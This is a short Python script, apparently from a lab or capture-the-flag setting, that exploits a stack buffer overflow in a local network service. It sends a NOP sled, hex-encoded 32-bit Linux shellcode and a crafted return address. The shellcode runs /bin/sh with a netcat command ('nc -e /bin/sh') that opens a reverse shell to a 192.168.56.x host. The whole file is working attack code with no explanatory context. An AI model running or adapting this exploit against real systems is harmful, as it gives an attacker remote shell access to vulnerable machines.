import socket
import sys

host = "127.0.0.1"
port = int(sys.argv[1])                  # The same port as used by the server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
x = int(sys.argv[2])
y = 68
#address = b"\xe4\xd3" + b"\xff\xff"

addr = hex(0xffff - int(sys.argv[3]))
#address = b"\xff\xd3\xff\xff"
address = bytes.fromhex(addr[2:]) + b"\xff\xff"
print(sys.argv[3] + "_________________" + str(address))
b = b'080' + b"\x90" * x + b"\x31\xc0\x68\x34\x34\x30\x20\x68\x26\x33\x20\x34\x68\x38\x2e\x35\x36\x68\x32\x2e\x31\x36\x68\x68\x20\x31\x39\x68\x69\x6e\x2f\x73\x68\x65\x20\x2f\x62\x68\x6e\x63\x20\x2d\x50\x68\x2d\x62\x63\x76\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe6\x89\xf3\x50\x8d\x76\x14\x56\x8d\x76\xf8\x56\x8d\x76\xf4\x56\x89\xe1\x31\xd2\xb0\x0b\xcd\x80" + b"\x41" * y + address
print(b)
s.sendall(b)
#while True:
data = s.recv(6000)
#	if data:
print(data)
#	b = input("Type your command: ")
#	s.sendall(b.encode())
s.close()
#print(repr(data))
